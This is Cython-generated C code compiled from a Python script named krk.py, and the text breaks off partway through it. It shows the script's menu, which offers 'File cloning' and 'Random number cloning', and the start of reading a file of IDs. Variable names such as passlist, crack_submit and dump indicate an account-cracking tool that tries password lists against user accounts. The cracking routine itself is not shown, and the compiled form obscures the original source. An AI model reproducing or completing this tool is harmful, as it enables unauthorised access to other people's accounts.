#define __pyx_int_99 __pyx_mstate_global->__pyx_int_99
#define __pyx_int_100 __pyx_mstate_global->__pyx_int_100
#define __pyx_int_111 __pyx_mstate_global->__pyx_int_111
#define __pyx_int_150 __pyx_mstate_global->__pyx_int_150
#define __pyx_int_999 __pyx_mstate_global->__pyx_int_999
#define __pyx_int_4200 __pyx_mstate_global->__pyx_int_4200
#define __pyx_int_4900 __pyx_mstate_global->__pyx_int_4900
#define __pyx_int_5000 __pyx_mstate_global->__pyx_int_5000
#define __pyx_int_11111 __pyx_mstate_global->__pyx_int_11111
#define __pyx_int_99999 __pyx_mstate_global->__pyx_int_99999
#define __pyx_int_111111111 __pyx_mstate_global->__pyx_int_111111111
#define __pyx_int_999999999 __pyx_mstate_global->__pyx_int_999999999
#define __pyx_tuple_ __pyx_mstate_global->__pyx_tuple_
#define __pyx_tuple__2 __pyx_mstate_global->__pyx_tuple__2
#define __pyx_tuple__3 __pyx_mstate_global->__pyx_tuple__3
#define __pyx_tuple__4 __pyx_mstate_global->__pyx_tuple__4
#define __pyx_tuple__5 __pyx_mstate_global->__pyx_tuple__5
#define __pyx_tuple__6 __pyx_mstate_global->__pyx_tuple__6
#define __pyx_tuple__7 __pyx_mstate_global->__pyx_tuple__7
#define __pyx_tuple__8 __pyx_mstate_global->__pyx_tuple__8
#define __pyx_tuple__9 __pyx_mstate_global->__pyx_tuple__9
#define __pyx_tuple__10 __pyx_mstate_global->__pyx_tuple__10
#define __pyx_tuple__11 __pyx_mstate_global->__pyx_tuple__11
#define __pyx_tuple__12 __pyx_mstate_global->__pyx_tuple__12
#define __pyx_tuple__13 __pyx_mstate_global->__pyx_tuple__13
#define __pyx_tuple__14 __pyx_mstate_global->__pyx_tuple__14
#define __pyx_tuple__15 __pyx_mstate_global->__pyx_tuple__15
#define __pyx_tuple__16 __pyx_mstate_global->__pyx_tuple__16
#define __pyx_tuple__17 __pyx_mstate_global->__pyx_tuple__17
#define __pyx_tuple__18 __pyx_mstate_global->__pyx_tuple__18
#define __pyx_tuple__19 __pyx_mstate_global->__pyx_tuple__19
#define __pyx_tuple__21 __pyx_mstate_global->__pyx_tuple__21
#define __pyx_tuple__23 __pyx_mstate_global->__pyx_tuple__23
#define __pyx_tuple__24 __pyx_mstate_global->__pyx_tuple__24
#define __pyx_tuple__26 __pyx_mstate_global->__pyx_tuple__26
#define __pyx_tuple__27 __pyx_mstate_global->__pyx_tuple__27
#define __pyx_tuple__28 __pyx_mstate_global->__pyx_tuple__28
#define __pyx_tuple__30 __pyx_mstate_global->__pyx_tuple__30
#define __pyx_tuple__32 __pyx_mstate_global->__pyx_tuple__32
#define __pyx_tuple__33 __pyx_mstate_global->__pyx_tuple__33
#define __pyx_tuple__34 __pyx_mstate_global->__pyx_tuple__34
#define __pyx_tuple__35 __pyx_mstate_global->__pyx_tuple__35
#define __pyx_tuple__36 __pyx_mstate_global->__pyx_tuple__36
#define __pyx_tuple__37 __pyx_mstate_global->__pyx_tuple__37
#define __pyx_tuple__38 __pyx_mstate_global->__pyx_tuple__38
#define __pyx_tuple__39 __pyx_mstate_global->__pyx_tuple__39
#define __pyx_tuple__40 __pyx_mstate_global->__pyx_tuple__40
#define __pyx_tuple__41 __pyx_mstate_global->__pyx_tuple__41
#define __pyx_tuple__42 __pyx_mstate_global->__pyx_tuple__42
#define __pyx_tuple__43 __pyx_mstate_global->__pyx_tuple__43
#define __pyx_tuple__44 __pyx_mstate_global->__pyx_tuple__44
#define __pyx_tuple__45 __pyx_mstate_global->__pyx_tuple__45
#define __pyx_tuple__46 __pyx_mstate_global->__pyx_tuple__46
#define __pyx_tuple__47 __pyx_mstate_global->__pyx_tuple__47
#define __pyx_tuple__48 __pyx_mstate_global->__pyx_tuple__48
#define __pyx_tuple__49 __pyx_mstate_global->__pyx_tuple__49
#define __pyx_tuple__50 __pyx_mstate_global->__pyx_tuple__50
#define __pyx_tuple__51 __pyx_mstate_global->__pyx_tuple__51
#define __pyx_tuple__53 __pyx_mstate_global->__pyx_tuple__53
#define __pyx_tuple__54 __pyx_mstate_global->__pyx_tuple__54
#define __pyx_tuple__55 __pyx_mstate_global->__pyx_tuple__55
#define __pyx_tuple__56 __pyx_mstate_global->__pyx_tuple__56
#define __pyx_tuple__57 __pyx_mstate_global->__pyx_tuple__57
#define __pyx_tuple__58 __pyx_mstate_global->__pyx_tuple__58
#define __pyx_tuple__59 __pyx_mstate_global->__pyx_tuple__59
#define __pyx_tuple__60 __pyx_mstate_global->__pyx_tuple__60
#define __pyx_tuple__61 __pyx_mstate_global->__pyx_tuple__61
#define __pyx_tuple__62 __pyx_mstate_global->__pyx_tuple__62
#define __pyx_tuple__64 __pyx_mstate_global->__pyx_tuple__64
#define __pyx_tuple__65 __pyx_mstate_global->__pyx_tuple__65
#define __pyx_tuple__66 __pyx_mstate_global->__pyx_tuple__66
#define __pyx_tuple__67 __pyx_mstate_global->__pyx_tuple__67
#define __pyx_tuple__69 __pyx_mstate_global->__pyx_tuple__69
#define __pyx_tuple__70 __pyx_mstate_global->__pyx_tuple__70
#define __pyx_tuple__71 __pyx_mstate_global->__pyx_tuple__71
#define __pyx_tuple__73 __pyx_mstate_global->__pyx_tuple__73
#define __pyx_tuple__74 __pyx_mstate_global->__pyx_tuple__74
#define __pyx_tuple__78 __pyx_mstate_global->__pyx_tuple__78
#define __pyx_tuple__79 __pyx_mstate_global->__pyx_tuple__79
#define __pyx_tuple__80 __pyx_mstate_global->__pyx_tuple__80
#define __pyx_tuple__81 __pyx_mstate_global->__pyx_tuple__81
#define __pyx_tuple__82 __pyx_mstate_global->__pyx_tuple__82
#define __pyx_tuple__83 __pyx_mstate_global->__pyx_tuple__83
#define __pyx_tuple__84 __pyx_mstate_global->__pyx_tuple__84
#define __pyx_tuple__85 __pyx_mstate_global->__pyx_tuple__85
#define __pyx_tuple__86 __pyx_mstate_global->__pyx_tuple__86
#define __pyx_tuple__87 __pyx_mstate_global->__pyx_tuple__87
#define __pyx_tuple__88 __pyx_mstate_global->__pyx_tuple__88
#define __pyx_tuple__89 __pyx_mstate_global->__pyx_tuple__89
#define __pyx_tuple__90 __pyx_mstate_global->__pyx_tuple__90
#define __pyx_tuple__93 __pyx_mstate_global->__pyx_tuple__93
#define __pyx_tuple__96 __pyx_mstate_global->__pyx_tuple__96
#define __pyx_tuple__98 __pyx_mstate_global->__pyx_tuple__98
#define __pyx_tuple__101 __pyx_mstate_global->__pyx_tuple__101
#define __pyx_tuple__103 __pyx_mstate_global->__pyx_tuple__103
#define __pyx_tuple__105 __pyx_mstate_global->__pyx_tuple__105
#define __pyx_tuple__108 __pyx_mstate_global->__pyx_tuple__108
#define __pyx_codeobj__94 __pyx_mstate_global->__pyx_codeobj__94
#define __pyx_codeobj__95 __pyx_mstate_global->__pyx_codeobj__95
#define __pyx_codeobj__97 __pyx_mstate_global->__pyx_codeobj__97
#define __pyx_codeobj__99 __pyx_mstate_global->__pyx_codeobj__99
#define __pyx_codeobj__100 __pyx_mstate_global->__pyx_codeobj__100
#define __pyx_codeobj__102 __pyx_mstate_global->__pyx_codeobj__102
#define __pyx_codeobj__104 __pyx_mstate_global->__pyx_codeobj__104
#define __pyx_codeobj__106 __pyx_mstate_global->__pyx_codeobj__106
#define __pyx_codeobj__107 __pyx_mstate_global->__pyx_codeobj__107
#define __pyx_codeobj__109 __pyx_mstate_global->__pyx_codeobj__109
/* #### Code section: module_code ### */

/* "krk.py":63
 * |   Versino      :     1.6
 * +==================================================+""")
 * def linex():             # <<<<<<<<<<<<<<
 *         print('\033[1;37m----------------------------------------------')
 * def clear():
 */

/* Python wrapper */
static PyObject *__pyx_pw_3krk_1linex(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_3krk_1linex = {"linex", (PyCFunction)__pyx_pw_3krk_1linex, METH_NOARGS, 0};
static PyObject *__pyx_pw_3krk_1linex(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues = __Pyx_KwValues_VARARGS(__pyx_args, __pyx_nargs);
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("linex (wrapper)", 0);
  __pyx_r = __pyx_pf_3krk_linex(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_3krk_linex(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("linex", 0);

  /* "krk.py":64
 * +==================================================+""")
 * def linex():
 *         print('\033[1;37m----------------------------------------------')             # <<<<<<<<<<<<<<
 * def clear():
 *         os.system('clear')
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple_, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":63
 * |   Versino      :     1.6
 * +==================================================+""")
 * def linex():             # <<<<<<<<<<<<<<
 *         print('\033[1;37m----------------------------------------------')
 * def clear():
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_AddTraceback("krk.linex", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "krk.py":65
 * def linex():
 *         print('\033[1;37m----------------------------------------------')
 * def clear():             # <<<<<<<<<<<<<<
 *         os.system('clear')
 *         print(logo)
 */

/* Python wrapper */
static PyObject *__pyx_pw_3krk_3clear(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_3krk_3clear = {"clear", (PyCFunction)__pyx_pw_3krk_3clear, METH_NOARGS, 0};
static PyObject *__pyx_pw_3krk_3clear(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues = __Pyx_KwValues_VARARGS(__pyx_args, __pyx_nargs);
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("clear (wrapper)", 0);
  __pyx_r = __pyx_pf_3krk_2clear(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_3krk_2clear(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("clear", 0);

  /* "krk.py":66
 *         print('\033[1;37m----------------------------------------------')
 * def clear():
 *         os.system('clear')             # <<<<<<<<<<<<<<
 *         print(logo)
 * loop=0
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 66, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 66, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  __pyx_t_4 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_4 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_2, __pyx_n_s_clear};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 66, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":67
 * def clear():
 *         os.system('clear')
 *         print(logo)             # <<<<<<<<<<<<<<
 * loop=0
 * oks=[]
 */
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_logo); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 67, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 67, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "krk.py":65
 * def linex():
 *         print('\033[1;37m----------------------------------------------')
 * def clear():             # <<<<<<<<<<<<<<
 *         os.system('clear')
 *         print(logo)
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_AddTraceback("krk.clear", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "krk.py":76
 * tokenku=[]
 * 
 * def menu():             # <<<<<<<<<<<<<<
 *         try:
 *                 clear()
 */

/* Python wrapper */
static PyObject *__pyx_pw_3krk_5menu(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_3krk_5menu = {"menu", (PyCFunction)__pyx_pw_3krk_5menu, METH_NOARGS, 0};
static PyObject *__pyx_pw_3krk_5menu(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues = __Pyx_KwValues_VARARGS(__pyx_args, __pyx_nargs);
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("menu (wrapper)", 0);
  __pyx_r = __pyx_pf_3krk_4menu(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_3krk_4menu(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_x = NULL;
  PyObject *__pyx_v_xd = NULL;
  PyObject *__pyx_v_file = NULL;
  PyObject *__pyx_v_fo = NULL;
  PyObject *__pyx_v_mthd = NULL;
  PyObject *__pyx_v_plist = NULL;
  PyObject *__pyx_v_ppp = NULL;
  PyObject *__pyx_v_ps_limit = NULL;
  PyObject *__pyx_v_i = NULL;
  PyObject *__pyx_v_cx = NULL;
  PyObject *__pyx_v_crack_submit = NULL;
  PyObject *__pyx_v_total_ids = NULL;
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_v_ids = NULL;
  PyObject *__pyx_v_names = NULL;
  PyObject *__pyx_v_passlist = NULL;
  PyObject *__pyx_v_dump = NULL;
  PyObject *__pyx_v_wx = NULL;
  PyObject *__pyx_v_url_wa = NULL;
  PyObject *__pyx_v_name = NULL;
  PyObject *__pyx_v_tks = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_t_7;
  int __pyx_t_8;
  int __pyx_t_9;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  int __pyx_t_16;
  Py_ssize_t __pyx_t_17;
  PyObject *(*__pyx_t_18)(PyObject *);
  Py_ssize_t __pyx_t_19;
  Py_UCS4 __pyx_t_20;
  PyObject *__pyx_t_21 = NULL;
  PyObject *(*__pyx_t_22)(PyObject *);
  PyObject *__pyx_t_23 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("menu", 0);

  /* "krk.py":77
 * 
 * def menu():
 *         try:             # <<<<<<<<<<<<<<
 *                 clear()
 *                 x = ("zea")
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "krk.py":78
 * def menu():
 *         try:
 *                 clear()             # <<<<<<<<<<<<<<
 *                 x = ("zea")
 *                 if x == ("zea"):
 */
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_clear); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 78, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = NULL;
      __pyx_t_7 = 0;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
          __pyx_t_7 = 1;
        }
      }
      {
        PyObject *__pyx_callargs[1] = {__pyx_t_6, };
        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 78, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      /* "krk.py":79
 *         try:
 *                 clear()
 *                 x = ("zea")             # <<<<<<<<<<<<<<
 *                 if x == ("zea"):
 *                         print(' [1] File cloning\n [2] Random number cloning\n [3] WhatsApp Group (join)\n [0] Exit menu')
 */
      __Pyx_INCREF(__pyx_n_s_zea);
      __pyx_v_x = __pyx_n_s_zea;

      /* "krk.py":80
 *                 clear()
 *                 x = ("zea")
 *                 if x == ("zea"):             # <<<<<<<<<<<<<<
 *                         print(' [1] File cloning\n [2] Random number cloning\n [3] WhatsApp Group (join)\n [0] Exit menu')
 *                         linex()
 */
      __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_v_x, __pyx_n_s_zea, Py_EQ)); if (unlikely((__pyx_t_8 < 0))) __PYX_ERR(0, 80, __pyx_L3_error)
      if (__pyx_t_8) {

        /* "krk.py":81
 *                 x = ("zea")
 *                 if x == ("zea"):
 *                         print(' [1] File cloning\n [2] Random number cloning\n [3] WhatsApp Group (join)\n [0] Exit menu')             # <<<<<<<<<<<<<<
 *                         linex()
 *                         xd=input(' Choose an option: ')
 */
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__2, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 81, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "krk.py":82
 *                 if x == ("zea"):
 *                         print(' [1] File cloning\n [2] Random number cloning\n [3] WhatsApp Group (join)\n [0] Exit menu')
 *                         linex()             # <<<<<<<<<<<<<<
 *                         xd=input(' Choose an option: ')
 *                         if xd in ['1','01']:
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_linex); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 82, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_6 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_6, };
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 82, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "krk.py":83
 *                         print(' [1] File cloning\n [2] Random number cloning\n [3] WhatsApp Group (join)\n [0] Exit menu')
 *                         linex()
 *                         xd=input(' Choose an option: ')             # <<<<<<<<<<<<<<
 *                         if xd in ['1','01']:
 *                                 clear()
 */
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__3, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 83, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_v_xd = __pyx_t_4;
        __pyx_t_4 = 0;

        /* "krk.py":84
 *                         linex()
 *                         xd=input(' Choose an option: ')
 *                         if xd in ['1','01']:             # <<<<<<<<<<<<<<
 *                                 clear()
 *                                 print(' Put file example:  /sdcard/File.txt ')
 */
        __Pyx_INCREF(__pyx_v_xd);
        __pyx_t_4 = __pyx_v_xd;
        __pyx_t_9 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_1, Py_EQ)); if (unlikely((__pyx_t_9 < 0))) __PYX_ERR(0, 84, __pyx_L3_error)
        if (!__pyx_t_9) {
        } else {
          __pyx_t_8 = __pyx_t_9;
          goto __pyx_L11_bool_binop_done;
        }
        __pyx_t_9 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_01, Py_EQ)); if (unlikely((__pyx_t_9 < 0))) __PYX_ERR(0, 84, __pyx_L3_error)
        __pyx_t_8 = __pyx_t_9;
        __pyx_L11_bool_binop_done:;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_9 = __pyx_t_8;
        if (__pyx_t_9) {

          /* "krk.py":85
 *                         xd=input(' Choose an option: ')
 *                         if xd in ['1','01']:
 *                                 clear()             # <<<<<<<<<<<<<<
 *                                 print(' Put file example:  /sdcard/File.txt ')
 *                                 linex()
 */
          __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_clear); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 85, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_6 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
            if (likely(__pyx_t_6)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
              __Pyx_INCREF(__pyx_t_6);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_5, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_6, };
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 85, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          }
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":86
 *                         if xd in ['1','01']:
 *                                 clear()
 *                                 print(' Put file example:  /sdcard/File.txt ')             # <<<<<<<<<<<<<<
 *                                 linex()
 *                                 file = input(' Put file path\033[1;37m: ')
 */
          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__4, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 86, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":87
 *                                 clear()
 *                                 print(' Put file example:  /sdcard/File.txt ')
 *                                 linex()             # <<<<<<<<<<<<<<
 *                                 file = input(' Put file path\033[1;37m: ')
 *                                 try:
 */
          __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_linex); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 87, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_6 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
            if (likely(__pyx_t_6)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
              __Pyx_INCREF(__pyx_t_6);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_5, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_6, };
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 87, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          }
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":88
 *                                 print(' Put file example:  /sdcard/File.txt ')
 *                                 linex()
 *                                 file = input(' Put file path\033[1;37m: ')             # <<<<<<<<<<<<<<
 *                                 try:
 *                                         fo = open(file,'r').read().splitlines()
 */
          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__5, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 88, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_v_file = __pyx_t_4;
          __pyx_t_4 = 0;

          /* "krk.py":89
 *                                 linex()
 *                                 file = input(' Put file path\033[1;37m: ')
 *                                 try:             # <<<<<<<<<<<<<<
 *                                         fo = open(file,'r').read().splitlines()
 *                                 except FileNotFoundError:
 */
          {
            __Pyx_PyThreadState_declare
            __Pyx_PyThreadState_assign
            __Pyx_ExceptionSave(&__pyx_t_10, &__pyx_t_11, &__pyx_t_12);
            __Pyx_XGOTREF(__pyx_t_10);
            __Pyx_XGOTREF(__pyx_t_11);
            __Pyx_XGOTREF(__pyx_t_12);
            /*try:*/ {

              /* "krk.py":90
 *                                 file = input(' Put file path\033[1;37m: ')
 *                                 try:
 *                                         fo = open(file,'r').read().splitlines()             # <<<<<<<<<<<<<<
 *                                 except FileNotFoundError:
 *                                         print(' File location not found ')
 */
              __pyx_t_6 = PyTuple_New(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 90, __pyx_L13_error)
              __Pyx_GOTREF(__pyx_t_6);
              __Pyx_INCREF(__pyx_v_file);
              __Pyx_GIVEREF(__pyx_v_file);
              PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_v_file);
              __Pyx_INCREF(__pyx_n_s_r);
              __Pyx_GIVEREF(__pyx_n_s_r);
              PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_n_s_r);
              __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_6, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 90, __pyx_L13_error)
              __Pyx_GOTREF(__pyx_t_13);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_13, __pyx_n_s_read); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 90, __pyx_L13_error)
              __Pyx_GOTREF(__pyx_t_6);
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
              __pyx_t_13 = NULL;
              __pyx_t_7 = 0;
